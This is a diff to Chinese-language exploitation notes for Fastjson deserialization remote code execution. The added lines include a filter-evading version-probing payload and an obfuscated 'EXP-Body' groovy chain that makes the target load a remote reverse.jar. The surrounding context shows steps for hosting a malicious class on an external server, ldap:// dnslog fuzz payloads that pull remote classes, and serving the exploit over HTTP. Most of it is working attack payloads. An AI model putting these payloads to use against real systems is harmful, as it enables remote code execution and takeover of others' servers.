@@ -1,5 +1,8 @@
 Fastjson漏洞可以命令执行
 
+利用报错探测版本：
+{"x":Set[{"\x40typ\u0065":"java.lang.AutoCloseable"
+
 攻击流程：
 1.找一台装有java的机器，运行	javac ExportObject.java会得到ExportObject.class
 2.将ExportObject.class放到外网http服务器上，比如。http://你的服务器ip/ExportObject.class
@@ -69,7 +72,7 @@ FUZZ:
 {"@type":"org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig","metricRegistry":"ldap://fast.bugseek.dnslog.cn/Calc"}
 {"@type":"org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig","healthCheckRegistry":"ldap://fast.bugseek.dnslog.cn/Calc"}
 
-1.2.80 + groovy 实现RCE
+Fastjson1.2.76-1.2.80 + groovy 实现RCE
 1、第一步：准备Calc.class
 
 IDEA打开https://github.com/Lonely-night/fastjsonVul/attack模块，Maven导入项目，然后创建Calc.java，自定义命令后Mvn编译。
@@ -103,4 +106,8 @@ Content-Length: 524
 "classpathList":"http://xxxxxxxx:8088/"
 }
 }
+
+EXP-Body
+{"e":Set[{"\x40\u0074yp\u0065":"org.codehaus.groovy.control.ProcessingUnit","\x40\u0074yp\u0065":"org.codehaus.groovy.tools.javac.JavaStubCompilationUnit","config":{"\x40\u0074yp\u0065":"org.codehaus.groovy.control.CompilerConfiguration","classpathList":"http://x.x.x.x.4:80/reverse.jar"}},
+
 3、使用python脚本运行http端口8088 即可打
